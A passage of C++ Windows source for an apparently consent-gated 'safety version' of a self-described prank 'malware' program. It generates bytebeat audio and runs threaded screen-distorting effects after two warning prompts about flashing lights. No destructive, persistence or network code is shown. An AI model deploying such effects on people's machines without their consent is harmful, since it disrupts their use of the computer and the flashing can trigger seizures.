    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t * 5) | ((t << 3 & t >> 6) | t >> 4 & t << 8) | t ^ t >> t * ((11 * t & 4 | t ^ 5) * (14 & t))));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound8() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(127 * (int(t * 0.2) & ((int(t * 0.2) >> 4) | (int(t * 0.2) >> 5))) + 1);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound9() {
    int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((((t >> 10) | (t >> 8)) ^ t) * t & 0x7f);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound10() {
    int nSamplesPerSec = 8500, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t * (t ^ t >> t) & t >> 8) | t >> 3) + (2 * t));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound11() {
    int nSamplesPerSec = 11020, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((t * (t ^ (t + (t >> 24)) ^ (((t * 4) ^ t) >> 10)) * t / 100000) ^ (int(sin(t & t | t ^ t))));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound12() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t >> 7) | (t >> 6) | t) * t & ((t >> 0xB) | (t >> 9)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound13() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(~t*(15596181>>(t>>9&14)&15)|t>>8);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound14() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((((11 & t * 4 & t >> 5) | (63 & t - 10 & t >> 10) - t % 5 | t * t)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound15() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((((t >> 10) | (t >> 8)) & t) * t);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound16() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(t * 8 * t * (t >> 7) + 20 | t >> t / 3);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound17() {
    int nSamplesPerSec = 9000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(t << (t >> 1) % (1 << (7 * (t >> 6 & t >> 10 & 63) >> 3)) ^ t >> 5);
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound18() {
    int nSamplesPerSec = 9000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t >> 8) * t & t << 4));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound19() {
    int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)(((t * (0x123456 & (t >> 8))) | (t >> 3)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound20() {
    int nSamplesPerSec = 24000, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((t >> (t & 16384 ? 2 : 3) & t * (t >> 5 & t >> 7) | t * (t >> 4 | t >> 6 & t >> 8) & 36 | (1 >> t)));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound21() {
    int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, (DWORD)nSamplesPerSec, (DWORD)nSamplesPerSec, 1, 8, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)nSampleCount, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
    for (INT t = 0; t < nSampleCount; t++) {
        BYTE bFreq = (BYTE)((t * (t >> 8 * (t >> 15 | t >> 8) & (20 | 5 ^ (t >> 19) >> t | t >> 3))));
        ((BYTE*)psSamples)[t] = bFreq;
    }
    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
    Sleep(nSampleCount * 1000 / nSamplesPerSec);
    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
void mainpayloads() {
    Sleep(5000);
    HANDLE thread0 = CreateThread(0, 0, msg, 0, 0, 0);
    Sleep(500);
    HANDLE thread1_num1 = CreateThread(0, 0, shader1, 0, 0, 0);
    HANDLE thread1_num2 = CreateThread(0, 0, icon1, 0, 0, 0);
    sound1();
    TerminateThread(thread1_num1, 0);
    refreshscr();
    HANDLE thread2_num1 = CreateThread(0, 0, shader2, 0, 0, 0);
    HANDLE thread2_num2 = CreateThread(0, 0, ballz, 0, 0, 0);
    sound2();
    TerminateThread(thread2_num1, 0);
    refreshscr();
    HANDLE thread3_num1 = CreateThread(0, 0, bitblt1, 0, 0, 0);
    HANDLE thread3_num2 = CreateThread(0, 0, icon2, 0, 0, 0);
    sound3();
    TerminateThread(thread3_num1, 0);
    refreshscr();
    HANDLE thread4_num1 = CreateThread(0, 0, shader3, 0, 0, 0);
    HANDLE thread4_num2 = CreateThread(0, 0, mixblt2, 0, 0, 0);
    sound4();
    TerminateThread(thread4_num1, 0);
    TerminateThread(thread4_num2, 0);
    refreshscr();
    HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
    sound5();
    TerminateThread(thread5, 0);
    refreshscr();
    HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
    sound6();
    TerminateThread(thread6, 0);
    refreshscr();
    HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
    sound7();
    TerminateThread(thread7, 0);
    refreshscr();
    HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
    sound8();
    TerminateThread(thread8, 0);
    refreshscr();
    HANDLE thread9_num1 = CreateThread(0, 0, shader8, 0, 0, 0);
    HANDLE thread9_num2 = CreateThread(0, 0, text1, 0, 0, 0);
    sound9();
    TerminateThread(thread9_num1, 0);
    refreshscr();
    HANDLE thread10_num1 = CreateThread(0, 0, shader9a, 0, 0, 0);
    HANDLE thread10_num2 = CreateThread(0, 0, shader9b, 0, 0, 0);
    sound10();
    TerminateThread(thread10_num1, 0);
    TerminateThread(thread10_num2, 0);
    TerminateThread(thread1_num2, 0);
    refreshscr();
    HANDLE thread11 = CreateThread(0, 0, shader10, 0, 0, 0);
    HANDLE thread11_num2 = CreateThread(0, 0, shader10b, 0, 0, 0);
    HANDLE thread11_num3 = CreateThread(0, 0, shader10c, 0, 0, 0);
    sound11();
    TerminateThread(thread11, 0);
    refreshscr();
    HANDLE thread12_num1 = CreateThread(0, 0, bitblt2, 0, 0, 0);
    HANDLE thread12_num2 = CreateThread(0, 0, patblt1, 0, 0, 0);
    sound12();
    TerminateThread(thread12_num1, 0);
    TerminateThread(thread12_num2, 0);
    TerminateThread(thread11_num2, 0);
    TerminateThread(thread11_num3, 0);
    refreshscr();
    HANDLE thread13 = CreateThread(0, 0, shader11, 0, 0, 0);
    sound13();
    TerminateThread(thread13, 0);
    refreshscr();
    HANDLE thread14_num1 = CreateThread(0, 0, mixblt3, 0, 0, 0);
    HANDLE thread14_num2 = CreateThread(0, 0, stretchblt1, 0, 0, 0);
    sound14();
    TerminateThread(thread14_num1, 0);
    TerminateThread(thread14_num2, 0);
    refreshscr();
    HANDLE thread15_num1 = CreateThread(0, 0, mixblt4, 0, 0, 0);
    HANDLE thread15_num2 = CreateThread(0, 0, text2, 0, 0, 0);
    sound15();
    TerminateThread(thread15_num1, 0);
    TerminateThread(thread15_num2, 0);
    refreshscr();
    HANDLE thread16_num1 = CreateThread(0, 0, shader12, 0, 0, 0);
    HANDLE thread16_num2 = CreateThread(0, 0, mixblt5, 0, 0, 0);
    sound16();
    TerminateThread(thread16_num1, 0);
    TerminateThread(thread16_num2, 0);
    refreshscr();
    HANDLE thread17 = CreateThread(0, 0, bitblt5, 0, 0, 0);
    sound17();
    TerminateThread(thread17, 0);
    refreshscr();
    HANDLE thread18 = CreateThread(0, 0, shader13, 0, 0, 0);
    sound18();
    TerminateThread(thread18, 0);
    refreshscr();
    g_shader7_running = true;
    HANDLE thread19 = CreateThread(0, 0, shader7, 0, 0, 0);
    sound19();
    g_shader7_running = false;
    TerminateThread(thread19, 0);
    refreshscr();
    HANDLE thread20 = CreateThread(0, 0, shader14, 0, 0, 0);
    HANDLE thread20_num2 = CreateThread(0, 0, rgb, 0, 0, 0);
    sound20();
    TerminateThread(thread20, 0);
    TerminateThread(thread20_num2, 0);
    refreshscr();
    HANDLE thread21 = CreateThread(0, 0, idk, 0, 0, 0);
    sound21();
    TerminateThread(thread21, 0);
    refreshscr();
}
int main()
{
    InitDPI();
    srand(time(NULL));
    Seedxorshift32((DWORD)time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (MessageBoxW(NULL, L"This is a safety version of dcfvgrf.exe, do you want to execute it?", L"dcfvgrf-safety.exe by VietNamLover", MB_YESNO | MB_ICONWARNING) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"It contains flashing lights and it not for epilepsy! STILL EXECUTE THIS MALWARE?!", L"dcfvgrf-safety.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            mainpayloads();
        }
    }
    return 0;
}